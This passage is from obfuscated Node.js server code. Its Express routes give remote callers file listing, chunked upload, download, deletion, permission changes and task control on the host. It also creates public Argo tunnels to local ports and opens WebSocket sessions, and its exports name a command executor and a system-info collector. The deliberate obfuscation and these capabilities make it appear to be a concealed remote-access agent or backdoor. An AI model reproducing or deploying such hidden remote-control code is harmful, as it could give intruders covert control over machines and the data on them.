                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[eI(0x423)](0x1f4)['json']({
                    'status': eI(0x528),
                    'message': p[eI(0x564)]
                });
            }
        }), i['put'](b['vsTQT'], async (m, n) => {
            const eJ = ex;
            try {
                const o = m[eJ(0x6f7)][eJ(0x2c8)] || {}, p = b[eJ(0x46e)](m['body'][eJ(0x497)], !![]), q = await a0S['setFilePermissions'](o, p);
                n[eJ(0x705)](q);
            } catch (r) {
                n[eJ(0x423)](0x1f4)[eJ(0x705)]({
                    'status': b[eJ(0x203)],
                    'message': r['message']
                });
            }
        }), i[ex(0x251)](b[ex(0x301)], async (m, n) => {
            const eK = ex;
            try {
                const o = await a0S[eK(0x52a)](m[eK(0x6f7)]['path']);
                n['json'](o);
            } catch (p) {
                n[eK(0x423)](0x1f4)[eK(0x705)]({
                    'status': b['OGewD'],
                    'message': p['message']
                });
            }
        }), i[ex(0x251)](b[ex(0x648)], async (m, n) => {
            const eL = ex;
            try {
                const o = await a0S[eL(0x6ce)](m['body'][eL(0x5d0)], m[eL(0x6f7)]['filename'], m['body'][eL(0x26a)], m['body']['chunk_id'], m['body'][eL(0x1cc)]);
                n[eL(0x705)](o);
            } catch (p) {
                n['status'](0x1f4)[eL(0x705)]({
                    'status': b[eL(0x203)],
                    'message': p[eL(0x564)]
                });
            }
        }), i[ex(0x251)](b['OIzVv'], a0f['raw']({
            'type': b[ex(0x1fb)],
            'limit': ex(0x505)
        }), async (m, n) => {
            const eM = ex;
            try {
                const o = b[eM(0x29e)](decodeURIComponent, m[eM(0x3c7)][b[eM(0x2c3)]] || ''), p = b['GzKEh'](decodeURIComponent, m['headers']['x-file-name'] || ''), q = m[eM(0x3c7)][b[eM(0x41b)]], r = m[eM(0x3c7)][b[eM(0x1e4)]];
                if (b[eM(0x703)](!o, !p))
                    return n[eM(0x423)](0x190)[eM(0x705)]({
                        'status': 'error',
                        'completed': ![],
                        'message': b[eM(0x424)]
                    });
                const s = b[eM(0x2e6)](q, undefined) ? b[eM(0x118)](parseInt, String(q), 0xa) : null, t = b['kLdkJ'](r, undefined) ? b['yURyv'](parseInt, b[eM(0x12b)](String, r), 0xa) : null, u = m[eM(0x6f7)];
                if (!Buffer[eM(0x325)](u))
                    return n['status'](0x190)[eM(0x705)]({
                        'status': b['OGewD'],
                        'completed': ![],
                        'message': b[eM(0x132)]
                    });
                const v = await a0S[eM(0x2e7)](o, p, u, s, t);
                n['json'](v);
            } catch (w) {
                n[eM(0x423)](0x1f4)[eM(0x705)]({
                    'status': eM(0x528),
                    'completed': ![],
                    'message': w[eM(0x564)]
                });
            }
        }), i[ex(0x251)](b[ex(0x511)], async (m, n) => {
            const eN = ex;
            try {
                const o = await a0S[eN(0x12d)](m['body'][eN(0x5d0)]), p = Buffer['from'](o[eN(0x26a)], b[eN(0x6d4)]);
                return n['set'](b[eN(0x473)], o[eN(0x6b6)]['toString']()), n[eN(0x2d1)](eN(0x6e9), o[eN(0x5d0)]), n[eN(0x2d1)](b[eN(0x470)], b['CVfUl']), n['send'](p);
            } catch (q) {
                n[eN(0x423)](0x1f4)[eN(0x705)]({
                    'status': b[eN(0x203)],
                    'message': q[eN(0x564)]
                });
            }
        }), i['delete'](b['yfrhs'], async (m, n) => {
            const eO = ex;
            try {
                let o = m[eO(0x6f7)]['paths'];
                if (!o || !Array['isArray'](o)) {
                    o = [];
                    if (m[eO(0x6f7)]['path'])
                        o['push'](m[eO(0x6f7)][eO(0x5d0)]);
                    if (m[eO(0x6f7)][eO(0x245)])
                        o['push'](m[eO(0x6f7)][eO(0x245)]);
                }
                const p = await a0S[eO(0x5eb)](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n['status'](0x1f4)[eO(0x705)]({
                    'status': 'error',
                    'message': q[eO(0x564)]
                });
            }
        }), i['put'](ex(0x677), async (m, n) => {
            const eP = ex;
            try {
                const o = await a0S[eP(0x412)](m[eP(0x6f7)][eP(0x1c4)] || m['body']);
                n[eP(0x705)]({
                    'status': 'ok',
                    'total': o[eP(0x5a7)],
                    'success': o[eP(0x6cc)](p => p['status'] === 'ok')['length'],
                    'results': o
                });
            } catch (p) {
                n[eP(0x423)](0x1f4)[eP(0x705)]({
                    'status': eP(0x528),
                    'message': p[eP(0x564)]
                });
            }
        }), i[ex(0x251)](b[ex(0x343)], async (m, n) => {
            const eQ = ex;
            try {
                const o = await a0S[eQ(0x63f)](m[eQ(0x6f7)]);
                n[eQ(0x705)]({
                    'status': 'ok',
                    'total': o['length'],
                    'success': o['filter'](p => p[eQ(0x423)] === 'ok')[eQ(0x5a7)],
                    'results': o
                });
            } catch (p) {
                n[eQ(0x423)](0x1f4)['json']({
                    'status': eQ(0x528),
                    'message': p[eQ(0x564)]
                });
            }
        }), i['post'](b[ex(0x447)], async (m, n) => {
            const eR = ex;
            try {
                const o = await a0S['createDirectory'](m['body'][eR(0x5d0)]);
                n[eR(0x705)](o);
            } catch (p) {
                n[eR(0x423)](0x1f4)[eR(0x705)]({
                    'status': eR(0x528),
                    'message': p[eR(0x564)]
                });
            }
        }), i['get'](b[ex(0x207)], (m, n) => {
            const eS = ex;
            n['json'](a0T[eS(0x18e)]());
        }), i[ex(0x251)](b['HwNGW'], async (m, n) => {
            const eT = ex;
            try {
                const o = await a0T[eT(0x552)](m['body']);
                n[eT(0x705)](o);
            } catch (p) {
                n[eT(0x423)](0x1f4)[eT(0x705)]({
                    'status': b['OGewD'],
                    'message': p[eT(0x564)]
                });
            }
        }), i[ex(0x12e)](b['JwZif'], (m, n) => {
            const eU = ex;
            n['json'](a0T[eU(0x4e2)]());
        }), i[ex(0x251)](b[ex(0x13b)], (m, n) => {
            const eV = ex;
            try {
                const o = a0T[eV(0x351)](m[eV(0x6f7)]);
                n[eV(0x705)](o);
            } catch (p) {
                n[eV(0x423)](0x1f4)['json']({
                    'status': b[eV(0x203)],
                    'message': p[eV(0x564)]
                });
            }
        }), i['get'](b['Knkrk'], (m, n) => {
            const eW = ex;
            n['json'](a0T[eW(0x1c1)]());
        }), i[ex(0x12e)](ex(0x65f), (m, n) => {
            const eX = ex;
            let o = b[eX(0x67f)](parseInt, m[eX(0x4ce)][eX(0x13a)], 0xa) || 0x32;
            o = Math[eX(0x39c)](Math['max'](o, 0x1), 0x64), n[eX(0x705)](a0T[eX(0x4a8)](o));
        }), i[ex(0x12e)](b[ex(0x3c9)], (m, n) => {
            const eY = ex;
            let o = b[eY(0x46a)](parseInt, m[eY(0x4ce)]['limit'], 0xa) || 0x32;
            o = Math['min'](Math[eY(0x405)](o, 0x1), 0x64), n[eY(0x705)](a0T[eY(0x252)](o));
        }), i[ex(0x395)](ex(0x65f), (m, n) => {
            const eZ = ex;
            n[eZ(0x705)](a0T[eZ(0x2ff)]());
        }), i[ex(0x395)](b[ex(0x3c9)], (m, n) => {
            const f0 = ex;
            n[f0(0x705)](a0T[f0(0x5e1)]());
        }), i['get'](b[ex(0x346)], (m, n) => {
            const f1 = ex;
            n['json'](a0T[f1(0x124)]());
        }), i[ex(0x251)](ex(0x1d0), async (m, n) => {
            const f2 = ex;
            try {
                const o = await a0T[f2(0x1af)]();
                n['json'](o);
            } catch (p) {
                n['status'](0x1f4)[f2(0x705)]({
                    'status': b[f2(0x203)],
                    'message': p[f2(0x564)]
                });
            }
        });
        const j = {
                'debug': (...m) => a0A[ex(0x550)](m[ex(0x575)]('\x20')),
                'info': (...m) => a0A[ex(0x684)](m['join']('\x20')),
                'warning': (...m) => a0A[ex(0x25b)](m[ex(0x575)]('\x20'))
            }, k = new a0aA(j);
        i[ex(0x12e)](b[ex(0x49a)], (m, n) => {
            const f3 = ex, o = k['list']();
            n['json']({
                'status': 'ok',
                'count': o[f3(0x5a7)],
                'tunnels': o
            });
        }), i[ex(0x251)]('/api/argo', async (m, n) => {
            const f4 = ex;
            try {
                const o = b[f4(0x430)](a0az, m[f4(0x6f7)]);
                let p = o['port'];
                (p === undefined || b['oYiCo'](p, null) || b['SluKB'](p, '')) && (p = a0M[f4(0x3a8)]);
                const q = Number(p);
                if (!Number[f4(0x691)](q) || b['fzsBC'](q, 0x1) || b[f4(0x2e9)](q, 0xffff))
                    return n['status'](0x1a6)['json']({
                        'status': b['OGewD'],
                        'created': ![],
                        'port': p,
                        'message': b[f4(0x19c)]
                    });
                const r = await k[f4(0x2d5)](q, b['oYiCo'](o[f4(0x177)], !![]));
                n['json']({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r['tunnelDomain'],
                    'port': r[f4(0x2ab)],
                    'created_at': r[f4(0x1ec)]
                });
            } catch (s) {
                n[f4(0x423)](s['status'] || 0x1f4)[f4(0x705)]({
                    'status': b[f4(0x203)],
                    'created': ![],
                    'port': s[f4(0x2ab)] ?? null,
                    'message': s[f4(0x564)]
                });
            }
        }), i[ex(0x395)](b[ex(0x49a)], async (m, n) => {
            const f5 = ex;
            try {
                const o = b[f5(0x12b)](a0az, m[f5(0x6f7)]), p = o['port'], q = b['WFpsp'](Number, p);
                if (b['SluKB'](p, undefined) || p === null || p === '' || !Number[f5(0x691)](q) || q < 0x1 || b[f5(0x604)](q, 0xffff))
                    return n['status'](0x1a6)['json']({
                        'status': b[f5(0x203)],
                        'deleted': 0x0,
                        'port': p ?? null,
                        'message': b['pphaP']
                    });
                const r = await k[f5(0x1e6)](q, o['tunnel_domain']);
                if (b[f5(0x633)](r['status'], 'ok'))
                    return n[f5(0x705)]({
                        'status': 'ok',
                        'deleted': r[f5(0x676)],
                        'port': q,
                        'tunnels': r['tunnels']
                    });
                return n[f5(0x423)](r[f5(0x423)])[f5(0x705)]({
                    'status': b[f5(0x203)],
                    'deleted': 0x0,
                    'port': q,
                    'message': r['message']
                });
            } catch (s) {
                n['status'](0x1f4)['json']({
                    'status': b[f5(0x203)],
                    'deleted': 0x0,
                    'message': s['message']
                });
            }
        }), a0A['debug'](b[ex(0x6cb)]), i['ws'](ex(0x638), async (m, n) => {
            const f6 = ex, o = n[f6(0x21c)][0x0];
            a0A['debug'](f6(0x121) + n[f6(0x64d)]), a0A[f6(0x550)](f6(0x275) + o);
            const p = n[f6(0x4ce)][f6(0x31d)], q = n[f6(0x4ce)][f6(0x455)];
            a0A[f6(0x550)](f6(0x3f1) + p);
            if (!p) {
                a0A['debug'](b[f6(0x4fd)]), m[f6(0x31e)](0x3f0, f6(0x3c5));
                return;
            }
            if (q && b[f6(0x3e2)](q, a0M[f6(0x21a)][f6(0x5ce)][f6(0x305)])) {
                a0A[f6(0x25b)](f6(0x4eb) + p + f6(0x282)), m['close'](0x3f0, b[f6(0x4e0)]);
                return;
            }
            const r = new a0aG();
            await r['startSession'](m, p, q);
        }), a0A[ex(0x550)](b[ex(0x1da)]), a0A[ex(0x550)](b['uqSMG']);
        const l = i[ex(0x451)](a0M[ex(0x3a8)], a0M[ex(0x4cd)], () => {
            const f7 = ex;
            a0A['debug'](f7(0x4ad) + a0M[f7(0x2a6)] + f7(0x6d3) + a0M[f7(0x4cd)] + ':' + a0M[f7(0x3a8)]), a0A['debug'](b[f7(0x5dd)]);
        });
        process['on'](b[ex(0x396)], () => {
            const f8 = ex;
            a0A[f8(0x550)](f8(0x146)), l[f8(0x31e)](), process[f8(0x47d)](0x0);
        }), a0A['debug'](ex(0x443));
    } catch (m) {
        a0A[ex(0x528)](b['KDWyC'], m), process['exit'](0x1);
    }
}
(require['main'] === module || require['main']?.[a0aK(0x1e5)]?.['includes'](a0aK(0x40f))) && a0aH()[a0aK(0x23f)](a0A['error']);
module[a0aK(0x563)] = {
    'main': a0aH,
    'Config': a0M,
    'CryptoManager': a0O,
    'SystemInfoCollector': a0Q,
    'CommandExecutor': a0R,
    'FileManager': a0S,
    'TaskManager': a0T,
    'ArgoTunnelManager': a0aA
};